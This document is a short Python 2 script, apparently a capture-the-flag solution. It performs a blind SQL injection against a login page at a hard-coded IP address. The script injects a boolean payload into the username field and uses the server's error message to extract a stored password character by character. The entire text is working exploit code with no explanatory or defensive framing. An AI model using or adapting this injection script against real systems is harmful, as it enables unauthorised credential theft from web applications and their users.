import requests

url = 'http://47.93.190.246:49167/index.php'
s = requests.Session()
result = ''
for i in range(1, 33):
    for j in range(48, 123):
        payload = "adminaa'||(ascii(mid((password)from(%d)))>%d)#" % (i, j)
        data = {"username": payload, "password": "123"}
        r = s.post(url, data=data)
        if "username does not exist!" in r.content:
            result += chr(j)
            print result
            break
print "password: " + result
